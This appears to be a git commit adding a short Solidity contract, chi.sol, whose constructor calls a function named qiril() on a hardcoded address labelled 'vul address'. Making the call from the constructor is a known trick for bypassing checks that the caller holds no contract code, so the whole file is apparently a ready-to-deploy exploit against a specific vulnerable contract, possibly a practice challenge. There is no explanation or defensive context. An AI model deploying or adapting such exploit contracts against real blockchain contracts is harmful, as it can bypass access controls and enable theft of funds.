42743c2051f1322ef097ee796749cecef031c7e2
nikaluka <47041738+nikaluka@users.noreply.github.com>
2020-12-05 22:16:57 +0100

    Create chi.sol

---
+++ chi.sol
@@ -0,0 +1,12 @@
+pragma solidity 0.5.0;
+interface qir{
+    function qiril() external;
+}
+
+   contract destuuur {
+     //smeni
+       address payable vul=0x7Fa2F07CC3F4EB45D5c4524c7dE5eC15A2c75763;// vul address
+       constructor() public{
+        qir(vul).qiril();
+    }
+             }
